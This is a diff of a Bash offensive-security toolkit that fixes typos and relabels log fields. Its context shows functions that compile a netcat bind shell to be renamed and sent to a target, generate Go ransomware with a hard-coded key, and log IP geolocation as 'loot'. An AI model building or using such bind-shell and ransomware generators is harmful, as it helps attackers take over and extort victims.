@@ -507,7 +507,7 @@ function handle_input() {
 		X - Back to main menu$x" ;;
         4) logo_etc ; echo -e "$p \n\n Enter Tool Number: $g
 
-        1 -$p Users and Shell's $b 		(find all users and there default shells local computer) $g
+        1 -$p Users and Shell's $b 		(find all users and their default shells local computer) $g
 
         2 -$p Python Web server $b 		(start a webserver for File Transfers) $g
 
@@ -666,7 +666,7 @@ find_that_ip() {
         lat=$(echo "$data" | jq -r '.lat')
         lon=$(echo "$data" | jq -r '.lon')
         isp=$(echo "$data" | jq -r '.isp')
-        echo -e "\n\nDate and Time: \t\t\t  $DATE \nUser Name:\t\t\t  $SUDO_USER \nProgram ran:\t\t\t  IP Search \nSearched IP:\t\t\t  $Ip \n---------------------------------------- \nCity:\t\t\t\t  $city \nState:\t\t\t\t  $regionName \nCountry:\t\t\t  $country \nZip:\t\t\t\t  $zip \nLatitude:\t\t\t  $lat \nLongitude:\t\t\t  $lon \nInternet Service Provider:\t  $isp" | tee -a "$Loot/IP-Lookup.txt"
+        echo -e "\n\nDate and Time: \t\t\t  $DATE \nUser Name:\t\t\t  $SUDO_USER \nScript Ran:\t\t\t  IP Search \nSearched IP:\t\t\t  $Ip \n---------------------------------------- \nCity:\t\t\t\t  $city \nState:\t\t\t\t  $regionName \nCountry:\t\t\t  $country \nZip:\t\t\t\t  $zip \nLatitude:\t\t\t  $lat \nLongitude:\t\t\t  $lon \nInternet Service Provider:\t  $isp" | tee -a "$Loot/IP-Lookup.txt"
 		if [[ -n $ports ]]; then
         	echo -e "Open Ports Found:\t\t  $ports" | tee -a "$Loot/IP-Lookup.txt"
         fi
@@ -676,7 +676,7 @@ find_that_ip() {
     	echo -e "$g\nInformation saved in $Loot/IP-Lookup.txt $x"
     else
         echo -e "$r Failed to retrieve information. $x"
-		echo -e "\n\nDate and Time: $DATE \nUser Name: $USER \nProgram ran: IP Searcher \nSearched IP: $Ip \nResults: Failed to retrieve information." >> "$Loot/IP-Lookup.txt"
+		echo -e "\n\nDate and Time: $DATE \nUser Name: $USER \nScript Ran: IP Searcher \nSearched IP: $Ip \nResults: Failed to retrieve information." >> "$Loot/IP-Lookup.txt"
     fi
 
     wait_and_return
@@ -857,7 +857,7 @@ netcat_shells_bind() {
     shc -r -f netcatbindshell.temp1 -o "$Malware"/NetcatBindingShellScript # compile script
     rm -f netcatbindshell.* "$NetcatBindShell" "$ncbo" # remove junk files
     echo -e "$c File \"NetcatBindingShellScript\" is ready and executable in the $Malware folder. \n Change the name of file before sending to target. $x"
-    echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser Port $chosen_port \nProgram Used: netcat binding shell create" >> "$log/NetcatBindShell.log" # log the information for user later if needed
+    echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser Port $chosen_port \nScript Ran: netcat binding shell create" >> "$log/NetcatBindShell.log" # log the information for user later if needed
     if [[ "$comeback" = 1 ]]; then
         break
     else
@@ -1006,7 +1006,7 @@ ransomware_in_go() {
         mv "$RansomwareEGo" "$Malware/$encfilename"
         mv "$RansomwareDGo" "$Malware/$decfilename"
     fi
-    popd &>/dev/null || retun
+    popd &>/dev/null || return
     echo "K5R0z4Js58vpNzSq4nixjQt2av8FcIvb" > "$Malware/$decfilename.key"
     echo -e "${g} \nThe encrypt and decrypt scripts are available in the ${r} $Malware ${g} folder if they are for a windows computer there will be a ${y} .exe extension ${x}"
     echo -e "${b} \nTo run the encryption script the target needs to run this command in there terminal: ${r} go run $encfilename ${x} (Linux,MacOS,FreeBSD,WebAssembly) - ${r} go run $encfilename.exe ${x} (Windows)"
